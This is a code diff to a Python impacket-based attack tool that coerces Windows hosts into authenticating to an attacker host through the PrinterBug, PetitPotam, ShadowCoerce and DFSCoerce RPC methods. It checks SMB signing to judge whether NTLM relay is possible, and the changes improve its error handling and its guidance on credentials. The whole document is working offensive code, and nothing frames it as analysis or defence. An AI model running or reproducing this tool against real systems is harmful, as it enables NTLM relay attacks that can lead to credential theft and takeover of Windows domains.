@@ -41,7 +41,7 @@ from impacket import version
 from impacket.dcerpc.v5 import transport, rprn, epm, even6
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5.rpcrt import DCERPCException
-# Simple restrained colors
+# Simple restrained colors, only for errors/warnings
 class Colors:
     RED = '\033[91m'
     YELLOW = '\033[93m'
@@ -105,6 +105,7 @@ class MultiCoercer:
         self.__dcHost = dcHost
         self.__targetIp = targetIp
         self.__method = method
+        self.__is_anon = (username == '' or username.lower() == 'guest')
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
     def tcp_ping(self, host):
@@ -128,11 +129,14 @@ class MultiCoercer:
             pass
         return None
     def trigger_printerbug(self, dce, host):
-        """MS-RPRN trigger, matches original output flow"""
+        """MS-RPRN trigger"""
         try:
             resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % host)
         except DCERPCException as e:
-            return False, str(e)
+            err_str = str(e)
+            if 'ACCESS_DENIED' in err_str.upper():
+                return 'access_denied', err_str
+            return 'connect_fail', err_str
         log_info("Got handle")
         request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
         request['hPrinter'] = resp['pHandle']
@@ -141,10 +145,10 @@ class MultiCoercer:
         request['pOptions'] = NULL
         try:
             dce.request(request)
-            return True, None
+            return 'triggered', None
         except DCERPCException as e:
-            # Most RPC errors here still mean auth was triggered
-            return True, str(e)
+            # Packet sent, auth likely triggered even on error
+            return 'triggered', str(e)
     def trigger_petitpotam(self, dce, host):
         """MS-EFSR PetitPotam trigger"""
         try:
@@ -153,9 +157,13 @@ class MultiCoercer:
             request['FileName'] = '\\\\%s\\test\x00' % self.__attackerhost
             request['Flags'] = 0
             dce.request(request)
-            return True, None
+            return 'triggered', None
         except DCERPCException as e:
-            return True, str(e)
+            err_str = str(e)
+            if 'ACCESS_DENIED' in err_str.upper():
+                return 'access_denied', err_str
+            # Packet sent, auth likely triggered
+            return 'triggered', err_str
     def trigger_shadowcoerce(self, dce, host):
         """MS-FSRVP ShadowCoerce trigger"""
         try:
@@ -164,9 +172,14 @@ class MultiCoercer:
             request['pwszShareName'] = '\\\\%s\\test\x00' % self.__attackerhost
             request['ppIsSupported'] = NULL
             dce.request(request)
-            return True, None
+            return 'triggered', None
         except DCERPCException as e:
-            return True, str(e)
+            err_str = str(e)
+            if 'ACCESS_DENIED' in err_str.upper():
+                return 'access_denied', err_str
+            if 'NOT_SUPPORTED' in err_str.upper():
+                return 'not_supported', err_str
+            return 'triggered', err_str
     def trigger_dfscoerce(self, dce, host):
         """MS-DFSNM DFSCoerce trigger"""
         try:
@@ -177,11 +190,14 @@ class MultiCoercer:
             request['RootComment'] = '\x00'
             request['ApiFlags'] = 0
             dce.request(request)
-            return True, None
+            return 'triggered', None
         except DCERPCException as e:
-            return True, str(e)
+            err_str = str(e)
+            if 'ACCESS_DENIED' in err_str.upper():
+                return 'access_denied', err_str
+            return 'triggered', err_str
     def coerce_host(self, remote_host, method=None):
-        """Coerce single host, original-style practical output"""
+        """Coerce single host, accurate practical output"""
         if method is None:
             method = self.__method
         if method == 'all':
@@ -189,11 +205,11 @@ class MultiCoercer:
         else:
             methods_to_try = [method]
         if self.__tcp_ping and not self.tcp_ping(remote_host):
-            log_warning(f"{remote_host}:{self.__port} is unreachable, skipping")
+            log_warning(f"{remote_host}:{self.__port} unreachable, skipping")
             return False
         for method_name in methods_to_try:
             method_info = self.METHODS[method_name]
-            log_info(f"Attempting to trigger authentication via {method_info['short_name']} RPC at {remote_host}")
+            log_info(f"Attempting trigger via {method_info['short_name']} RPC at {remote_host}")
             try:
                 bind_str = f'ncacn_np:{remote_host}[{method_info["pipe"]}]'
                 rpctransport = transport.DCERPCTransportFactory(bind_str)
@@ -208,34 +224,64 @@ class MultiCoercer:
                 if method_name == methods_to_try[0]:
                     signing_required = self.check_smb_signing(rpctransport)
                     if signing_required is True:
-                        log_warning(f"{remote_host} has SMB signing ENFORCED - NTLM relay will NOT work!")
+                        log_warning(f"SMB signing ENFORCED - NTLM relay will NOT work")
                     elif signing_required is False:
-                        log_info(f"{remote_host} SMB signing not enforced - relay is possible")
+                        log_info(f"SMB signing not enforced - relay is possible")
                 dce = rpctransport.get_dce_rpc()
                 dce.connect()
                 dce.bind(method_info['uuid'])
                 log_info("Bind OK")
                 # Run trigger
                 if method_name == 'printerbug':
-                    success, err = self.trigger_printerbug(dce, remote_host)
+                    status, err = self.trigger_printerbug(dce, remote_host)
                 elif method_name == 'petitpotam':
-                    success, err = self.trigger_petitpotam(dce, remote_host)
+                    status, err = self.trigger_petitpotam(dce, remote_host)
                 elif method_name == 'shadowcoerce':
-                    success, err = self.trigger_shadowcoerce(dce, remote_host)
+                    status, err = self.trigger_shadowcoerce(dce, remote_host)
                 elif method_name == 'dfscoerce':
-                    success, err = self.trigger_dfscoerce(dce, remote_host)
+                    status, err = self.trigger_dfscoerce(dce, remote_host)
                 else:
-                    success, err = False, 'Unknown method'
+                    status, err = 'fail', 'Unknown method'
                 dce.disconnect()
-                if err:
-                    print(err)
-                if success:
-                    log_info("Triggered RPC backconnect, this may or may not have worked")
+                # Handle different statuses accurately
+                if status == 'triggered':
+                    if err:
+                        print(err)
+                    log_info(f"Triggered backconnect to {self.__attackerhost} via {method_info['short_name']}, check your listener")
                     return True
+                elif status == 'access_denied':
+                    print(err)
+                    if self.__is_anon:
+                        log_warning("Access denied with anonymous/guest, try valid domain credentials")
+                    else:
+                        log_warning("Access denied, current credentials lack required permissions")
+                    if len(methods_to_try) == 1:
+                        return False
+                    continue
+                elif status == 'not_supported':
+                    print(err)
+                    log_warning(f"{method_info['short_name']} method not supported on target")
+                    if len(methods_to_try) == 1:
+                        return False
+                    continue
+                else: # connect_fail / other
+                    if err:
+                        print(err)
+                    continue
             except Exception as e:
-                log_verbose(f"{method_info['name']} connection failed: {str(e)}")
+                err_str = str(e)
+                if 'timed out' in err_str.lower() or 'connection refused' in err_str.lower():
+                    log_warning(f"Connection failed: {err_str}")
+                elif 'ACCESS_DENIED' in err_str.upper():
+                    print(err_str)
+                    if self.__is_anon:
+                        log_warning("Access denied with anonymous/guest, try valid domain credentials")
+                    else:
+                        log_warning("Access denied, current credentials lack required permissions")
+                else:
+                    log_verbose(f"{method_info['short_name']} failed: {err_str}")
                 continue
-        log_error(f"{remote_host}: All coercion methods failed")
+        log_error(f"{remote_host}: All methods failed")
         return False
 def main():
     # Init impacket logger
@@ -265,7 +311,7 @@ def main():
                        help="Skip pre-connection TCP ping")
     group = parser.add_argument_group('authentication')
     group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format LMHASH:NTHASH')
-    group.add_argument('-no-pass', action="store_true", help="Don't ask for password")
+    group.add_argument('-no-pass', action="store_true", help="Don't ask for password (anonymous/relay)")
     group.add_argument('-k', action="store_true", help='Use Kerberos authentication')
     group.add_argument('-dc-ip', action="store", metavar="ip address",
                        help='Domain controller IP')
@@ -328,6 +374,6 @@ def main():
             log_warning("Interrupted by user")
             break
     if len(targets) > 1:
-        print(f"\n[*] Done. Successfully triggered {success_count}/{len(targets)} targets")
+        print(f"\n[*] Done. Triggered {success_count}/{len(targets)} targets")
 if __name__ == '__main__':
     main()
